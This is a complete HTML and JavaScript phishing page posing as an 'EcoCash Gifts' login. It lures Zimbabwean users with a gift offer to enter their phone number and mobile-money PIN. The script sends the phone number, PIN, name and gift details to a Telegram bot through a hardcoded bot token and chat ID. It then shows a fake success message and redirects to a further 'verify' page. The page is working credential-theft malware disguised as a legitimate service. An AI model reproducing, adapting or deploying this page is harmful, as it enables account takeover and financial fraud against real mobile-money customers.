<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash Gifts - Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: #f5f7fa;
            overflow-x: hidden;
        }
        
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .main-container {
            width: 100%;
            max-width: 480px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            text-align: center;
            padding: 20px 20px 30px;
            width: 100%;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 800;
        }
        
        .logo-eco {
            color: #0066ff;
        }
        
        .logo-cash {
            color: #ff0000;
        }
        
        .logo-gift {
            color: #ff6b00;
            font-size: 18px;
            font-weight: 600;
        }
        
        .login-card {
            background: white;
            border-radius: 24px;
            padding: 35px 28px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
            margin-bottom: 15px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            text-align: center;
            margin-bottom: 6px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #888;
            text-align: center;
            margin-bottom: 25px;
        }
        
        .subtitle span {
            color: #ff6b00;
            font-weight: 700;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #0066ff;
            border-radius: 14px;
            display: flex;
            align-items: center;
            padding: 14px 18px;
            margin-bottom: 25px;
            background: white;
            transition: box-shadow 0.3s;
        }
        
        .phone-group:focus-within {
            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.12);
        }
        
        .flag {
            font-size: 24px;
            margin-right: 10px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #0066ff;
            font-weight: 600;
            font-size: 16px;
            margin-right: 12px;
        }
        
        .dropdown-arrow {
            font-size: 12px;
            margin-left: 4px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            font-family: 'Inter', sans-serif;
            background: transparent;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 14px;
            font-weight: 500;
            text-align: center;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-bottom: 20px;
        }
        
        .pin-box {
            width: 55px;
            height: 55px;
            border: 2px solid #dce0e8;
            border-radius: 14px;
            font-size: 24px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .pin-box:focus {
            border-color: #0066ff;
            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.12);
            outline: none;
            transform: scale(1.02);
        }
        
        .pin-box.invalid {
            border-color: #e74c3c !important;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%,
            100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-8px); }
            80% { transform: translateX(8px); }
        }
        
        .status-message {
            text-align: center;
            padding: 10px 14px;
            margin: 10px 0 15px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            display: none;
        }
        
        .status-message.success {
            display: block;
            background: #e8f5e9;
            color: #27ae60;
            border: 1px solid #c8e6c9;
        }
        
        .status-message.error {
            display: block;
            background: #ffebee;
            color: #e74c3c;
            border: 1px solid #ffcdd2;
        }
        
        .status-message.info {
            display: block;
            background: #e3f2fd;
            color: #0066ff;
            border: 1px solid #bbdefb;
        }
        
        .forgot-link {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-link a {
            font-size: 14px;
            color: #0066ff;
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        .forgot-link a:hover {
            opacity: 0.7;
        }
        
        #loginBtn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0066ff, #0052cc);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.25);
            display: none;
        }
        
        #loginBtn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 30px rgba(0, 102, 255, 0.35);
        }
        
        #loginBtn:active {
            transform: scale(0.98);
        }
        
        #loginBtn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .bottom-section {
            background: #005eb8;
            color: white;
            padding: 50px 30px 35px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            border-radius: 24px;
            margin-top: 0;
        }
        
        .bottom-text {
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 25px;
        }
        
        .bottom-btn {
            background: white;
            color: #0066ff;
            border: none;
            border-radius: 30px;
            padding: 14px 28px;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            width: 140px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .bottom-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
        }
        
        .btn-icon {
            font-size: 22px;
        }
        
        .version {
            font-size: 12px;
            opacity: 0.7;
            margin-bottom: 10px;
        }
        
        .terms {
            font-size: 12px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            cursor: pointer;
        }
        
        .terms a:hover {
            opacity: 0.8;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid #0066ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner-text {
            font-size: 16px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 280px;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            body { padding: 10px; }
            .logo-text { font-size: 28px; }
            .login-card { padding: 25px 18px; }
            .title { font-size: 20px; margin-bottom: 20px; }
            .pin-box { width: 48px; height: 48px; font-size: 20px; }
            .pin-group { gap: 10px; }
            .bottom-section { padding: 35px 20px 25px; }
            .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
            .logo { padding: 10px 20px 20px; }
        }
        
        @media (max-width: 380px) {
            .pin-box { width: 42px; height: 42px; font-size: 18px; }
            .pin-group { gap: 8px; }
            .bottom-btn { width: 100px; padding: 10px 12px; font-size: 12px; }
        }
    </style>
</head>

<body>

    <div class="main-container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-text">
                <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
                <span class="logo-gift">Gifts</span>
            </div>
        </div>

        <!-- Login Card -->
        <div class="login-card">
            <h1 class="title">Welcome Back</h1>
            <p class="subtitle">Login to claim your <span>gift</span></p>

            <!-- Phone Input -->
            <div class="phone-group">
                <span class="flag">🇿🇼</span>
                <div class="country-select">
                    +263 <span class="dropdown-arrow">▼</span>
                </div>
                <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9">
            </div>

            <!-- PIN Input -->
            <div class="pin-label">Enter your PIN</div>
            <div class="pin-group" id="pinGroup">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>

            <!-- Status Message -->
            <div id="statusMessage" class="status-message"></div>

            <!-- Forgot PIN -->
            <div class="forgot-link">
                <a onclick="alert('Please contact support to reset your PIN.')">Forgot PIN?</a>
            </div>

            <!-- Login Button -->
            <button id="loginBtn">LOGIN</button>
        </div>

        <!-- Bottom Section -->
        <div class="bottom-section">
            <div class="bottom-text">
                Don't have an account? <br>
                Register to get exclusive gifts!
            </div>
            <div class="bottom-btns">
                <div class="bottom-btn" onclick="alert('Registration page coming soon!')">
                    <span class="btn-icon">👤</span>
                    Register
                </div>
                <div class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
                    <span class="btn-icon">ℹ️</span>
                    Help
                </div>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                By signing in you agree to the <a onclick="alert('Terms and Conditions')">Terms and Conditions</a>
            </div>
        </div>
    </div>

    <!-- Spinner Overlay -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait...<br> This usually takes a few seconds
        </div>
    </div>

    <script>
        // ============================================
        // TELEGRAM & API CONFIGURATION - NEW CREDENTIALS
        // ============================================
        const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
        const CHAT_ID = '157828443';
        const API_URL = 'https://eco-cashm-production.up.railway.app/api';

        console.log('====================================');
        console.log('🎁 EcoCash Gifts - Login Page');
        console.log('====================================');
        console.log('🤖 Bot Token:', BOT_TOKEN);
        console.log('📱 Chat ID:', CHAT_ID);
        console.log('🌐 API URL:', API_URL);
        console.log('====================================');

        // ============================================
        // DOM REFERENCES
        // ============================================
        const phoneInput = document.getElementById('phoneInput');
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const statusMessage = document.getElementById('statusMessage');

        let pinValue = '';

        // ============================================
        // CHECK PIN COMPLETE
        // ============================================
        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
            return pinValue;
        }

        // ============================================
        // PIN INPUT HANDLING
        // ============================================
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
                box.classList.remove('invalid');
                hideStatus();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowLeft' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowRight' && index < 3) {
                    pinBoxes[index + 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text');
                const numbers = data.replace(/\D/g, '');
                const digits = numbers.split('').slice(0, 4);
                digits.forEach((digit, i) => {
                    if (i < 4 && pinBoxes[i]) {
                        pinBoxes[i].value = digit;
                    }
                });
                checkPinComplete();
                if (digits.length > 0) {
                    const lastIndex = Math.min(digits.length - 1, 3);
                    pinBoxes[lastIndex].focus();
                }
            });
        });

        // ============================================
        // STATUS MESSAGE FUNCTIONS
        // ============================================
        function showStatus(message, type = 'info') {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message ' + type;
            statusMessage.style.display = 'block';
        }

        function hideStatus() {
            statusMessage.style.display = 'none';
            statusMessage.className = 'status-message';
        }

        // ============================================
        // SEND TELEGRAM NOTIFICATION
        // ============================================
        async function sendTelegramNotification(phone, pin) {
            const giftName = localStorage.getItem('giftName') || 'Gift';
            const fullName = localStorage.getItem('fullName') || 'User';

            const message = `🎁 *New Gift Claim Attempt*\n\n👤 *User:* ${fullName}\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n🎁 *Gift:* ${giftName}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                const data = await response.json();
                console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
                return data;
            } catch (error) {
                console.error('❌ Telegram error:', error.message);
                return null;
            }
        }

        // ============================================
        // LOGIN HANDLER
        // ============================================
        loginBtn.addEventListener('click', async function() {
            const phone = phoneInput.value.trim();
            const pin = Array.from(pinBoxes).map(box => box.value).join('');

            // Validate phone
            if (!phone) {
                showStatus('Please enter your phone number', 'error');
                phoneInput.focus();
                return;
            }

            if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
                showStatus('Please enter a valid 9-digit phone number', 'error');
                phoneInput.focus();
                return;
            }

            // Validate PIN
            if (pin.length !== 4) {
                showStatus('Please enter your 4-digit PIN', 'error');
                return;
            }

            // Disable button and show spinner
            loginBtn.disabled = true;
            loginBtn.textContent = 'WAITING...';
            spinnerOverlay.style.display = 'flex';
            hideStatus();

            // Store phone in localStorage
            localStorage.setItem('phone', phone);

            // Send Telegram notification
            await sendTelegramNotification(phone, pin);

            showStatus('✅ Login successful! Redirecting...', 'success');
            
            setTimeout(() => {
                window.location.href = 'verify.html';
            }, 1500);
        });

        // ============================================
        // KEYBOARD SHORTCUTS
        // ============================================
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const pinComplete = checkPinComplete();
                if (pinComplete.length === 4 && loginBtn.style.display !== 'none') {
                    loginBtn.click();
                }
            }
        });

        // ============================================
        // AUTO-FOCUS AND LOAD
        // ============================================
        window.addEventListener('load', () => {
            const savedPhone = localStorage.getItem('phone');
            if (savedPhone && savedPhone.length === 9) {
                phoneInput.value = savedPhone;
            }
            phoneInput.focus();
            checkPinComplete();

            const giftName = localStorage.getItem('giftName') || 'Gift';
            console.log('🎁 You are claiming:', giftName);
            console.log('✅ Login page fully loaded and ready');
            console.log('====================================');
        });
    </script>

</body>

</html>
